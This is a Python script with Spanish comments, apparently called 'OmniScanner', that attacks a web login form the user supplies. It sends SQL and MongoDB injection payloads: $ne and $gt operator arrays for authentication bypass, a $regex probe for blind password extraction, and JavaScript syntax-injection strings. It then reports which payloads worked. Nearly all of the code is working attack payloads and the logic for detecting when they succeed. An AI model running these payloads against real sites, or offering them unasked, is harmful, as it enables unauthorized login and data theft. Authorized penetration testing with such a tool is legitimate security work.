#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib3
import signal
from dataclasses import dataclass, field
from typing import Dict, Optional

# Silenciar alertas SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 🎨 UI & COLORES
# ==========================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def handler(signum, frame):
    print(f"\n{Colors.YELLOW}[!] Saliendo...{Colors.END}")
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

@dataclass
class TargetConfig:
    url: str
    headers: Dict[str, str] = field(default_factory=lambda: {
        'User-Agent': 'OmniScanner/Architect-v1.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    verbose: bool = False

# ==========================================
# 🧠 MOTOR DE AUDITORÍA (Logic Core)
# ==========================================
class NoSQLAuditor:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session = requests.Session()
        self.session.verify = False 
        self.baseline_len = 0
        self.baseline_code = 0

    def log(self, msg: str, type: str = "INFO"):
        prefix = {
            "INFO": f"{Colors.BLUE}[*]{Colors.END}",
            "SUCCESS": f"{Colors.GREEN}[+]{Colors.END}",
            "WARN": f"{Colors.YELLOW}[!]{Colors.END}",
            "DEBUG": f"{Colors.HEADER}[D]{Colors.END}"
        }
        if type == "DEBUG" and not self.config.verbose: return
        print(f"{prefix.get(type, '[?]')} {msg}")

    def validate_connection(self) -> bool:
        """Health Check antes de empezar."""
        self.log(f"Ping a {self.config.url}...", "INFO")
        try:
            r = self.session.get(self.config.url, timeout=5)
            self.log(f"Objetivo vivo (Status {r.status_code})", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"No se puede conectar: {e}", "WARN")
            choice = input(f"{Colors.YELLOW}   ¿Continuar de todas formas? (s/n): {Colors.END}")
            return choice.lower().startswith('s')

    def establish_baseline(self):
        self.log("Estableciendo línea base (Baseline)...")
        try:
            r = self.session.post(
                self.config.url, 
                data={"user": "baseline_chk", "pass": "wrong_pass_999"}, 
                headers=self.config.headers,
                timeout=10
            )
            self.baseline_code = r.status_code
            self.baseline_len = len(r.content)
            self.log(f"Baseline: HTTP {self.baseline_code} | Size {self.baseline_len}", "DEBUG")
        except Exception as e:
            self.log(f"Error crítico: {e}", "WARN")
            sys.exit(1)

    def is_anomaly(self, response: requests.Response) -> bool:
        if response.status_code != self.baseline_code: return True
        if abs(len(response.content) - self.baseline_len) > (self.baseline_len * 0.1): return True
        return False

    # --- FASE 1: DETECCIÓN DB ---
    def detect_db(self):
        self.log("Analizando tecnología de Backend...", "INFO")
        
        # Test SQL
        r_sql = self.session.post(self.config.url, data={"user": "' OR 1=1 --", "pass": "x"})
        if "SQL" in r_sql.text or "MySQL" in r_sql.text:
            self.log("Detectado: SQL (MySQL/MariaDB). Probablemente NO vulnerable a NoSQLi.", "WARN")
            return

        # Test NoSQL (PHP Array)
        try:
            r_nosql = self.session.post(self.config.url, data={"user[$ne]": "dummy", "pass": "dummy"})
            if self.is_anomaly(r_nosql):
                self.log("Detectado: MongoDB (vía PHP Array Injection).", "SUCCESS")
                return
        except: pass
        self.log("Tecnología no concluyente (Black Box Mode).", "WARN")

    # --- FASE 2: AUTH BYPASS ---
    def check_bypass(self):
        self.log("Buscando Auth Bypass...", "INFO")
        payloads = [
            ({"user[$ne]": "imposible", "pass[$ne]": "imposible"}, "PHP Array ($ne)"),
            ({"user[$gt]": ""}, "PHP Array ($gt)")
        ]
        for data, name in payloads:
            r = self.session.post(self.config.url, data=data)
            if self.is_anomaly(r):
                self.log(f"VULNERABLE: {name}", "SUCCESS")
                self.log(f" -> Payload: {data}", "SUCCESS")
                return
        self.log("No se encontró bypass simple.", "DEBUG")

    # --- FASE 3: EXTRACTION ---
    def check_extraction(self):
        self.log("Verificando Extracción (Blind Regex)...", "INFO")
        # Payload para verificar si el regex se procesa
        payload = {"user": "admin", "pass[$regex]": "^."}
        r = self.session.post(self.config.url, data=payload)
        
        if r.status_code == 302 and "err" not in r.headers.get("Location", ""):
            self.log("VULNERABLE CRÍTICO: Extracción Regex posible.", "SUCCESS")
        else:
            self.log("Extracción Regex no confirmada.", "DEBUG")

    # --- FASE 4: SYNTAX INJECTION ---
    def check_syntax(self):
        self.log("Buscando Syntax Injection (JS)...", "INFO")
        js_payloads = ["admin'||1||'", "admin' || '1'=='1"]
        for p in js_payloads:
            r = self.session.post(self.config.url, data={"user": p, "pass": "x"})
            if len(r.content) > (self.baseline_len * 1.5):
                self.log(f"VULNERABLE: Syntax Injection (JS RCE)", "SUCCESS")
                self.log(f" -> Payload: {p}", "SUCCESS")
                return
            if "SyntaxError" in r.text:
                self.log(f"Information Leak: Error JS detectado.", "WARN")

# ==========================================
# 🚀 MAIN (Lógica Híbrida)
# ==========================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OmniScanner - NoSQL Vulnerability Auditor")
    # Quitamos 'required=True'
    parser.add_argument("-u", "--url", help="URL del Login (POST)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Activar modo debug")
    args = parser.parse_args()

    print(f"{Colors.BOLD}{Colors.HEADER}--- OMNISCANNER v2.0 (Interactive) ---{Colors.END}")
    
    # 1. Obtención de URL Inteligente
    target_url = args.url
    if not target_url:
        print(f"{Colors.BLUE}[INPUT] No pasaste argumentos. Modo Interactivo activado.{Colors.END}")
        raw_input = input(f"{Colors.BOLD}>>> Introduce la URL del objetivo: {Colors.END}").strip()
        
        if not raw_input:
            print(f"{Colors.FAIL}[!] URL vacía. Saliendo.{Colors.END}")
            sys.exit(1)
            
        # Auto-corrección de protocolo
        if not raw_input.startswith("http"):
            print(f"{Colors.YELLOW}[i] Añadiendo http:// automáticamente...{Colors.END}")
            target_url = f"http://{raw_input}"
        else:
            target_url = raw_input
    
    # 2. Iniciar Auditoría
    cfg = TargetConfig(url=target_url, verbose=args.verbose)
    auditor = NoSQLAuditor(cfg)

    if auditor.validate_connection():
        auditor.establish_baseline()
        auditor.detect_db()
        auditor.check_bypass()
        auditor.check_extraction()
        auditor.check_syntax()
    
    print(f"\n{Colors.BLUE}[*] Auditoría finalizada.{Colors.END}")